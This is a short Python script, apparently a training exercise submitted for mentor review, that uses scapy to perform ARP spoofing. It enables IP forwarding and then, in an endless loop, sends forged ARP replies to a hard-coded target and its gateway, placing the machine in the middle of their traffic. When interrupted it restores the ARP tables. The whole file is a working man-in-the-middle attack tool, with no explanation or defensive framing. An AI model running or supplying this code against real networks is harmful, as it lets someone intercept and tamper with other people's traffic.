from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import time
'''ready for mantor CR'''

def enable_linux_iproute(status=False):
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path, "w") as f:
        if status:
            print(1, file=f)
        else:
            print(0, file=f)


def get_mac(ip):
    answered, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
    answered.summary()

    if answered:
        return answered[0][1].src


def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)


def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)



def main():
    target = "10.1.0.120"
    host = "10.1.0.254"
    enable_linux_iproute(True)
    try:
        while 42:
            spoof(target, host)
            spoof(host, target)
            time.sleep(1)
    except KeyboardInterrupt:
        print("keyboard interrupt")
        restore(target, host)
        restore(host, target)
        enable_linux_iproute(False)


if __name__ == "__main__":
    main()
